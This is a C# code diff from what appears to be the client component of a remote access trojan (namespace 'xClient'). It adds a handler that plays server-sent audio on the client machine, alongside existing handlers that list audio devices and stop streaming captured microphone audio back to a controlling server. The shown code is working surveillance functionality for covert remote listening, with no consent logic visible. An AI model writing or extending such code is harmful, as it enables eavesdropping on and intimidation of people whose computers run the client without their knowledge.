@@ -1,9 +1,11 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using NAudio.Wave;
 using xClient.Core.NAudio.Wave;
 using xClient.Core.NAudio.Wave.WaveFormats;
 using xClient.Core.NAudio.Wave.WaveInputs;
+using xClient.Core.NAudio.Wave.WaveOutputs;
 using xClient.Core.Networking;
 using xClient.Core.Packets.ClientPackets;
 
@@ -13,6 +15,9 @@ namespace xClient.Core.Commands {
 
         private static WaveInEvent _waveInEvent { get; set; }
         public static bool StreamRunning { get; set; }
+        private static BufferedWaveProvider WaveProvider { get; set; }
+        private static WaveOut WaveOut { get; set; }
+
 
 
         public static void HandleGetAudioDevices(Packets.ServerPackets.GetAudioDevices command, Client client) {
@@ -61,6 +66,21 @@ namespace xClient.Core.Commands {
                 _waveInEvent.Dispose();
                 StreamRunning = false;
                 new StopAudioStreamResponse(StreamRunning).Execute(client);
+            }
+            catch(Exception ex) {
+                Debug.WriteLine($@"{ex.Message}\n{ex.StackTrace}\n{ex.Source}");
+            }
+        }
+
+        public static void HandleDoSpeak(Packets.ServerPackets.DoSpeak command, Client client) {
+
+            try {
+
+                WaveOut = new WaveOut();
+                WaveProvider = new BufferedWaveProvider(new WaveFormat());
+                WaveOut.Init(WaveProvider);
+                WaveProvider.AddSamples(command.SpokenData, 0, command.SpokenData.Length);
+                WaveOut.Play();
             }
             catch(Exception ex) {
                 Debug.WriteLine($@"{ex.Message}\n{ex.StackTrace}\n{ex.Source}");
